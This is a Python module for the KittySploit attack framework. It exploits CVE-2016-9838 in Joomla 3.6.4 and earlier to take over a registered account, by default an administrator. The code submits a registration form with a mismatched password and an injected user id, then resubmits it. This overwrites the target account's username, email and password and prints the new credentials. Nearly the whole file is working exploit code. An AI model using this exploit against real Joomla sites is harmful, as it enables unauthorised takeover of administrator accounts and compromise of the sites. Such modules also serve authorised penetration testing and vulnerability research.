from kittysploit import *
from lib.protocols.http.http_client import Http_client
from bs4 import BeautifulSoup

class Module(Auxiliary, Http_client):


	__info__ = {
		'name': 'Joomla <= 3.6.4 admin takeover',
		'description': "An issue was discovered in components/com_users/models/registration.php in Joomla! before 3.6.5."\
						"Incorrect filtering of registration form data stored to the session on a validation error enables a"\
						"user to gain access to a registered user's account and reset the user's group mappings, username,"\
						"and password, as demonstrated by submitting a form that targets the `registration.register` task.",
		'author': 'KittySploit Team',
		'cve': '2016-9838',		
		}
	
	admin_id = OptInteger(384, "admin id", True)
	new_password = OptString("pwned", "new password", True)
	
	def run(self):
		
		form_url = '/index.php/component/users/?view=registration'
		action_url = '/index.php/component/users/?task=registration.register'

		username = f'user{self.random_number(8)}'
		email = self.random_text(10) + '@yopmail.com'
		password = self.random_text(10)
		
		user_data = {
			'name': username,
			'username': username,
			'password1': password,
			'password2': password + 'XXXinvalid',
			'email1': email,
			'email2': email,
			'id': '%d' % self.admin_id
		}

		response = self.http_request(
								method = "GET",
								path=form_url,
								session=True)
		if not response:
			fail.NotVulnerable()
			return False
		try:
			soup = BeautifulSoup(response.text, 'lxml')

			form = soup.find('form', id='member-registration')
			data = {e['name']: e['value'] for e in form.find_all('input')}


			user_data = {'jform[%s]' % k: v for k, v in user_data.items()}
			data.update(user_data)
		except:
			print_error("Failed to parse form data")
			fail.NotVulnerable()
			return False

		response = self.http_request(
								method = "POST",
								path=action_url,
								data=data,
								session=True)
		if not response:
			fail.NotVulnerable()
			return False
		data['jform[password2]'] = data['jform[password1]']
		del data['jform[id]']
		response = self.http_request(
								method = "POST",
								path=action_url,
								data=data,
								session=True)
		if not response:
			fail.NotVulnerable()
		print_status(f"Account modified to user: {username}")
		print_status(f"Account email: {email}")
		Vulnerable.SUCCESS()
		return True